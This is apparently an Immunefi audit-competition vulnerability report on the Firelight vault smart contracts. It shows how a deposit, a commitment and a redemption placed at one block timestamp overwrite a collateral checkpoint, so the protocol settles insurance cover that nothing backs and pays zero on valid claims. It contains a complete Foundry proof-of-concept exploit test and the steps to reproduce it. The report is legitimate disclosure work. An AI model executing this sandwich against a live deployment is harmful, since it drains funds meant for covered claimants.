# 88570 sc high period boundary checkpoint overwrite creates unbacked cover and zeroes valid payouts

**Submitted on Aug 13th 2026 at 21:29:06 UTC by @v\_c0d35 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88570
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

**Period-boundary checkpoint overwrite creates unbacked cover and zeroes valid payouts**

## Brief/Intro

At assessed commit [`42f9ea5e43d88b35197b901acc2a8c24b314fa62`](https://github.com/immunefi-team/audit-comp-firelight/tree/42f9ea5e43d88b35197b901acc2a8c24b314fa62), an unprivileged staker can deposit immediately before an honest period-start capacity commitment and redeem immediately afterward under the same block timestamp, retroactively replacing the collateral checkpoint with zero while the allocator retains and settles the committed cover and the vault subsequently pays zero for a valid claim.

## Vulnerability Details

`FirelightVault.currentPeriodStart()` calculates the current boundary from the configured epoch and duration ([`FirelightVault.sol` lines 342–345](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L342-L345)). Production execution requires a produced block whose timestamp equals that exact boundary, the honest allocator's commitment in that block, and transaction ordering of the attacker's deposit, the honest commitment, and the attacker's redemption. This exact-timestamp boundary block and three-transaction placement are tight exploitation constraints; once they are satisfied, every call follows an accepted contract path.

The attacker first calls the public `deposit`. After the ordinary pause, blocklist, incident, amount, and deposit-limit checks, `_depositFunds` increases active assets and records the resulting value through `_logTrace` ([`FirelightVault.sol` lines 646–673](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L646-L673), [`FirelightVault.sol` lines 976–992](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L976-L992)):

```solidity
_totalAssets += assets;
...
_deposit(caller, receiver, assets, shares);
_logTrace(receiver, balanceOf(receiver), _totalSupply, _totalAssets, true);
```

In the submitted PoC, this writes 10,000 six-decimal asset units at the period-start timestamp. The historical accessor returns the latest checkpoint at or before the requested timestamp, so `totalAssetsAt(periodStart)` now reports those 10,000 units ([`FirelightVault.sol` lines 450–458](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L450-L458)).

The honest allocator then commits its allocation. `commitAllocation` validates the matching capacity against `_computeAvailableCapacity` and stores it in `commit.totalAvailableCapacity` ([`CoverOrderAllocator.sol` lines 332–356](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L356), [`CoverOrderAllocator.sol` lines 394–403](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L394-L403)). Capacity is calculated from the vault's assets at `currentPeriodStart()`, the asset price, first-loss buffer, effective leverage, minimum capital adequacy ratio, and divergence tolerance ([`CoverOrderAllocator.sol` lines 689–724](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L724)):

```solidity
uint256 totalAssetsCanonical = Decimals.convert(
    $.vault.totalAssetsAt($.vault.currentPeriodStart()),
    $.vaultAssetDecimals,
    CANONICAL_DECIMALS,
    Math.Rounding.Floor
);
uint256 stakedAssetsValueUSDCanonical = totalAssetsCanonical.mulDiv(assetPriceUSD, 10 ** $.priceFeedDecimals);
uint256 availableCollateralCanonical = firstLossBufferUSDCanonical + stakedAssetsValueUSDCanonical;
uint256 strictCapacity = availableCollateralCanonical.mulDiv(config.effectiveLeverage, config.minCAR);
```

The PoC uses a $1 price, equal `effectiveLeverage` and `minCAR` values for one-to-one capacity, zero first-loss-buffer balance, zero divergence tolerance, and a 100% market concentration limit. The 10,000-unit checkpoint therefore permits and stores 10,000 canonical units of capacity.

The attacker next redeems every share without advancing the timestamp. `redeem` calculates the assets, moves them into delayed-withdrawal accounting, and logs zero remaining active assets ([`FirelightVault.sol` lines 717–743](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L717-L743)). `_requestWithdraw` increases `withdrawAssets` and `pendingWithdrawAssets`, so the 10,000 tokens remain held by the vault while awaiting the attacker's later claim ([`FirelightVault.sol` lines 994–1027](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L994-L1027)). `_logTrace` pushes that zero active-asset value under the unchanged block timestamp ([`FirelightVault.sol` lines 1044–1056](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L1044-L1056)).

The decisive behavior is `Checkpoints.Trace256.push`: when the new key equals the latest key, it overwrites the value in place rather than appending a distinct record ([`Checkpoints.sol` lines 193–215](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L193-L215)):

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

The redemption consequently changes `totalAssetsAt(periodStart)` from 10,000 to zero after that same value has already justified the commitment. The commitment remains 10,000 because the allocator copied the validated capacity into its own storage.

Settlement loads this stored commitment, verifies the allocation proof, derives the concentration cap from `commit.totalAvailableCapacity`, marks a fully allocated order `MATCHED`, and increments `commit.totalSettledCover` without rereading the vault snapshot ([`CoverOrderAllocator.sol` lines 457–524](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L457-L524)). It then transfers the allocated premium from the buyer to the premium collector ([`CoverOrderAllocator.sol` lines 529–535](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L529-L535)). The order is therefore fully settled against capacity whose source snapshot now reads zero.

For a claim captured in the affected period, `FirelightVault.payout` independently reads the overwritten period-start snapshot. Although its `activePayableAmount` includes withdrawals requested in the capture period, `paidAmount` is the minimum of the requested amount, `assetsAtCapturePeriod`, and `activePayableAmount` ([`FirelightVault.sol` lines 895–930](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L895-L930)):

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
...
uint256 activePayableAmount = currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

Because `assetsAtCapturePeriod` is zero, a valid 10,000-unit request transfers zero even while the vault holds the attacker's 10,000 pending-withdrawal units. After the delay, `claimWithdraw` reduces `pendingWithdrawAssets` and transfers the full withdrawal to the attacker ([`FirelightVault.sol` lines 788–810](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L788-L810)).

The submitted PoC deploys the public contracts locally, performs this exact sequence, and asserts each intermediate state: 10,000 assets at the boundary before commitment, 10,000 stored canonical capacity, zero historical and active assets after redemption, 10,000 pending-withdrawal assets, a fully `MATCHED` order, zero payout, and full withdrawal recovery by the attacker. A fresh public checkout run with Forge 1.5.1-stable and Solc 0.8.28 passed its single test: 1 passed, 0 failed.

## Impact Details

In the demonstrated configuration, the attacker temporarily supplies 10,000 units of a six-decimal vault asset valued by the mock oracle at $1 per unit. The allocator records and settles nominal $10,000 cover, the buyer pays the corresponding settlement premium, and a valid 10,000-unit vault payout transfers $0 to the configured on-chain payout receiver. The attacker later receives the full 10,000-unit pending withdrawal. The direct on-chain shortfall is therefore 10,000 vault-asset units, while the buyer also paid the premium for that settled allocation; the attacker's demonstrated economic commitment is the temporary use of the injected principal through the withdrawal delay.

For an injected amount `X`, let `Xc` be its floor-converted 18-decimal value, `P` the oracle USD price, `d` the oracle decimals, `L` the effective leverage, `C` the minimum capital adequacy ratio, and `T` the divergence tolerance in basis points. With zero first-loss-buffer balance, the source formula yields approximately:

```
injected capacity = (Xc × P / 10^d) × L / C × (10,000 + T) / 10,000
```

The actual committed and settled amount remains bounded by capacity validation, the allocator's declared allocation, market concentration, order size, and configuration limits. For a valid payout request, the realized on-chain shortfall is bounded by the matched cover and requested amount; when the overwritten capture-period cap is zero, the vault transfers none of the otherwise payable request to the configured receiver.

The loss mechanism scales with the amount of temporary capital that can pass the vault's deposit limit and the capacity permitted by the active oracle and allocator configuration. It directly affects funds expected to satisfy covered claims because the same mutable period-start checkpoint first authorizes settlement and later acts as the payout exposure cap.

## References

* [`FirelightVault`: period boundary and historical asset lookup](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L342-L458)
* [`FirelightVault`: deposit and redemption entry points](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L646-L743)
* [`FirelightVault`: delayed withdrawal claim](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L788-L810)
* [`FirelightVault`: payout cap](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L895-L930)
* [`FirelightVault`: deposit, withdrawal, and timestamp trace updates](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol#L976-L1056)
* [`CoverOrderAllocator`: allocation commitment and validation](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L332-L403)
* [`CoverOrderAllocator`: settlement and premium transfer](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L457-L535)
* [`CoverOrderAllocator`: period-start capacity calculation](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/CoverOrderAllocator.sol#L689-L724)
* [`Checkpoints.Trace256.push`: same-key replacement](https://github.com/immunefi-team/audit-comp-firelight/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol#L193-L215)

## Proof of Concept

The test places three calls at one exact period-start timestamp:

1. The attacker deposits 10,000 six-decimal vault-asset units.
2. The honest allocator commits 10,000 canonical units of capacity using that period-start checkpoint.
3. The attacker redeems all shares, causing the checkpoint at the same timestamp to be replaced with zero.

The allocator can still settle the 10,000-unit cover as `MATCHED`, but the vault subsequently caps a payout for that capture period at zero. After the withdrawal delay, the attacker claims the full 10,000 units.

## Prerequisites

Install:

* Git.
* Node.js and npm. The verified run used Node.js 24.13.0 and npm 11.6.2.
* Foundry, including `forge`. The verified run used Forge 1.5.1-stable; Forge downloads Solc 0.8.28 when it builds this test.
* Internet access for the public Git repositories, npm packages, and Solidity compiler.

If Foundry is not already installed, use its standard installer and then open a new shell:

```sh
curl -L https://foundry.paradigm.xyz | bash
foundryup
forge --version
```

No RPC URL, funded key, environment file, or deployed-contract address is needed.

## 1. Obtain the assessed public source

Run these commands in a directory where you want the fresh checkout to be created:

```sh
git clone --branch v1_audit_ready --single-branch https://github.com/immunefi-team/audit-comp-firelight.git
cd audit-comp-firelight
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
git rev-parse HEAD
```

The final command must print:

```
42f9ea5e43d88b35197b901acc2a8c24b314fa62
```

This pins the checkout to the exact public revision used for the reproduction even if the branch later moves.

## 2. Install the repository dependencies and forge-std

From the repository root, run:

```sh
npm install
forge install foundry-rs/forge-std@467ffd422ca01fed5797a4c766a1e4e3a5327902 --no-git
```

Allow the repository's npm `postinstall` step to run. It applies the checked-in OpenZeppelin patch. The second command places the public `forge-std` test library at `lib/forge-std` and pins the same revision used for the verified run.

The npm lock file refers to public GitHub and GitLab repositories through SSH URLs. If npm reports an SSH authentication error, configure Git to rewrite those public SSH URLs to HTTPS, rerun `npm install`, and then continue. No private dependency is required.

## 3. Add the Foundry configuration

Save the following file as `foundry.toml` in the repository root, replacing it if it already exists:

```toml
[profile.default]
src = "contracts"
test = "test"
out = "out"
libs = ["node_modules", "lib"]
fs_permissions = [{ access = "read", path = "./artifacts" }]
skip = ["contracts/fasset/**"]
evm_version = "london"
optimizer = true
optimizer_runs = 10000
via_ir = true
auto_detect_remappings = true
remappings = [
  "forge-std/=lib/forge-std/src/",
  "@openzeppelin/contracts-upgradeable/=node_modules/@openzeppelin/contracts-upgradeable/",
  "@openzeppelin/contracts/=node_modules/@openzeppelin/contracts/",
]
```

The `fasset` exclusion keeps the reproduction focused on the Firelight core contracts and avoids compiling the separate legacy dependency tree. The PoC still uses the repository's real `FirelightVault`, `CoverOrderAllocator`, `CoverNFT`, checkpoint library, mock ERC-20, and mock price feed.

## 4. Add the proof of concept

Save the following file as `test/CapacitySnapshotReplacement.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {FirelightVault} from "contracts/core/FirelightVault.sol";
import {CoverOrderAllocator} from "contracts/core/CoverOrderAllocator.sol";
import {CoverNFT} from "contracts/core/CoverNFT.sol";
import {ICoverOrderAllocator} from "contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IFirelightVault} from "contracts/core/interfaces/IFirelightVault.sol";
import {MockERC20} from "contracts/test/MockERC20.sol";
import {MockPriceFeed} from "contracts/test/MockPriceFeed.sol";

contract CapacitySnapshotReplacementTest is Test {
    uint48 private constant PERIOD = 1 days;
    uint256 private constant ASSETS = 10_000e6;
    uint256 private constant COVER = 10_000e18;
    address private constant ATTACKER = address(0xA11CE);
    address private constant BUYER = address(0xB0B);
    address private constant PAYOUT_RECEIVER = address(0xBEEF);

    MockERC20 private asset;
    FirelightVault private vault;
    CoverOrderAllocator private allocator;
    CoverNFT private coverNFT;
    bytes32 private marketId;

    function testExploit() public {
        vm.warp(1_000_000);
        _deploy();
        _createNextPeriodOrder();

        uint48 boundary = vault.currentPeriodEnd();
        vm.warp(boundary);
        assertEq(vault.currentPeriod(), 1);
        assertEq(vault.currentPeriodStart(), boundary);

        asset.mint(ATTACKER, ASSETS);
        vm.startPrank(ATTACKER);
        asset.approve(address(vault), ASSETS);
        uint256 attackerShares = vault.deposit(ASSETS, ATTACKER);
        vm.stopPrank();
        assertEq(vault.totalAssetsAt(boundary), ASSETS);

        ICoverOrderAllocator.MarketCoverAllocation[] memory allocations =
            new ICoverOrderAllocator.MarketCoverAllocation[](1);
        allocations[0] = ICoverOrderAllocator.MarketCoverAllocation({marketId: marketId, allocatedCover: COVER});
        bytes32 root = keccak256(bytes.concat(keccak256(abi.encode(uint256(0), allocations))));

        allocator.commitAllocation(1, root, COVER, COVER);
        ICoverOrderAllocator.AllocationCommitment memory commit = allocator.getAllocationCommitment(1);
        assertEq(commit.totalAvailableCapacity, COVER);

        vm.prank(ATTACKER);
        assertEq(vault.redeem(attackerShares, ATTACKER, ATTACKER), ASSETS);

        assertEq(vault.totalAssetsAt(boundary), 0);
        assertEq(vault.totalAssets(), 0);
        assertEq(vault.pendingWithdrawAssets(), ASSETS);

        bytes32[] memory proof = new bytes32[](0);
        allocator.settleCoverOrder(0, allocations, proof);

        ICoverOrderAllocator.CoverOrder memory order = allocator.getCoverOrder(0);
        commit = allocator.getAllocationCommitment(1);
        assertEq(uint256(order.status), uint256(ICoverOrderAllocator.CoverOrderStatus.MATCHED));
        assertEq(order.allocatedCoverAmount, COVER);
        assertEq(commit.totalSettledCover, COVER);
        assertGt(commit.totalAvailableCapacity, vault.totalAssetsAt(boundary));

        assertEq(vault.payout(PAYOUT_RECEIVER, ASSETS, boundary), 0);
        assertEq(asset.balanceOf(PAYOUT_RECEIVER), 0);

        vm.warp(uint256(boundary) + 2 * PERIOD);
        vm.prank(ATTACKER);
        assertEq(vault.claimWithdraw(2), ASSETS);
        assertEq(asset.balanceOf(ATTACKER), ASSETS);
    }

    function _deploy() private {
        asset = new MockERC20("USD", "USD", 6);

        FirelightVault vaultImplementation = new FirelightVault();
        FirelightVault.InitParams memory vaultParams = FirelightVault.InitParams({
            defaultAdmin: address(this),
            limitUpdater: address(0),
            blocklister: address(0),
            pauser: address(0),
            periodConfigurationUpdater: address(0),
            rescuer: address(0),
            depositLimit: type(uint128).max,
            periodConfigurationDuration: PERIOD
        });
        bytes memory vaultData = abi.encodeCall(
            FirelightVault.initialize,
            (asset, "Firelight Vault", "FLV", abi.encode(vaultParams))
        );
        vault = FirelightVault(address(new ERC1967Proxy(address(vaultImplementation), vaultData)));

        CoverNFT nftImplementation = new CoverNFT();
        bytes memory nftData = abi.encodeCall(
            CoverNFT.initialize,
            ("Firelight Cover", "COVER", "", address(this), address(this), address(0), address(0))
        );
        coverNFT = CoverNFT(address(new ERC1967Proxy(address(nftImplementation), nftData)));

        MockPriceFeed feed = new MockPriceFeed(18, 1e18);

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concentrations =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        concentrations[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1,
            protocol: "Protocol",
            maxProtocolConcentrationBps: 10_000
        });

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: "Protocol", market: bytes32("Market")});
        marketId = keccak256(abi.encode(uint64(1), "Protocol", bytes32("Market")));

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(asset);
        ICoverOrderAllocator.CapacityConfig memory capacityConfig = ICoverOrderAllocator.CapacityConfig({
            minCAR: 12_000,
            firstLossBufferToken: asset,
            firstLossBuffer: address(0xF1B),
            effectiveLeverage: 12_000,
            minOrderMarketCoverAmount: 1,
            divergenceToleranceBps: 0
        });
        ICoverOrderAllocator.InitParams memory allocatorParams = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(vault)),
            premiumCollector: address(0xC011EC7),
            coverNFT: coverNFT,
            priceFeedAdapter: feed,
            maxPriceAge: 2 days,
            premiumTokens: premiumTokens,
            admin: address(this),
            adminRole: address(this),
            curatorRole: address(this),
            allocatorRole: address(this),
            configAdminRole: address(this),
            initialProtocolConcentrations: concentrations,
            newMarkets: markets,
            capacityConfig: capacityConfig
        });

        CoverOrderAllocator allocatorImplementation = new CoverOrderAllocator();
        bytes memory allocatorData = abi.encodeCall(CoverOrderAllocator.initialize, (allocatorParams));
        allocator = CoverOrderAllocator(address(new ERC1967Proxy(address(allocatorImplementation), allocatorData)));
        coverNFT.grantRole(coverNFT.MINTER_ROLE(), address(allocator));

        vault.grantRole(vault.PAYOUT_ROLE(), address(this));
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), address(this));
        vault.addToPayoutAllowlist(PAYOUT_RECEIVER);
    }

    function _createNextPeriodOrder() private {
        ICoverOrderAllocator.MarketAllocationInput[] memory markets =
            new ICoverOrderAllocator.MarketAllocationInput[](1);
        markets[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId,
            coverRateAnnual: 500,
            coverAmount: COVER
        });

        allocator.createCoverOrder(
            BUYER,
            PAYOUT_RECEIVER,
            "beneficiary",
            address(asset),
            markets,
            ICoverOrderAllocator.CoverOrderType.NEW
        );

        asset.mint(BUYER, 100e6);
        vm.prank(BUYER);
        asset.approve(address(allocator), type(uint256).max);
    }
}
```

## 5. Build and run

From the repository root, run:

```sh
forge build
forge test --match-path test/CapacitySnapshotReplacement.t.sol -vvv
```

`forge build` should finish with:

```
Compiler run successful!
```

The verified fresh-checkout test run contained these exact result lines:

```
Ran 1 test for test/CapacitySnapshotReplacement.t.sol:CapacitySnapshotReplacementTest
[PASS] testExploit() (gas: 18078038)
Suite result: ok. 1 passed; 0 failed; 0 skipped;
```

Gas reporting can differ across Foundry versions, but the test name, `PASS`, and zero-failure summary are the material results.

## 6. What the passing assertions establish

The test stops immediately if any of these state transitions differs:

* `vm.warp(boundary)` makes the EVM timestamp equal the next period's exact start, and the vault reports period 1 beginning at that timestamp.
* After the attacker's deposit, `totalAssetsAt(boundary) == 10_000e6`, proving the allocator has a nonzero period-start value to consume.
* The honest allocation commitment succeeds and stores `totalAvailableCapacity == 10_000e18`.
* The attacker redeems without advancing time. Active assets and `totalAssetsAt(boundary)` both become zero, while `pendingWithdrawAssets == 10_000e6`. The tokens have not left the vault; the repeated timestamp has replaced the checkpoint value.
* Honest settlement still marks the order `MATCHED`, allocates and settles `10_000e18`, and leaves committed capacity greater than the now-zero period-start snapshot.
* A payout request for `10_000e6` at the affected capture timestamp returns zero, and the payout receiver receives zero.
* After two periods, the attacker claims all `10_000e6`, confirming that the temporary capital remained recoverable by the withdrawing staker rather than backing the payout.

The local test grants the trusted allocator and payout permissions to its own setup contract solely to exercise the same production entry points. The attacker's calls use only the ordinary staker operations `deposit`, `redeem`, and `claimWithdraw`; the PoC does not demonstrate that the attacker can obtain a privileged role.

## 7. Timing and production limitations

The PoC deliberately controls time and execution order. It proves that Firelight's contracts accept the vulnerable state transition when deposit, honest commit, and redeem execute at the identical period-start timestamp.

A production attempt additionally requires:

* a produced Flare block whose timestamp is exactly the calculated period start rather than merely later than it;
* the honest allocator to commit in that boundary block; and
* the attacker's deposit to execute before that commit and the attacker's redemption after it in the same block.

A same block "sandwich attack".

No cleanup is necessary beyond deleting the disposable local checkout and Foundry build output.
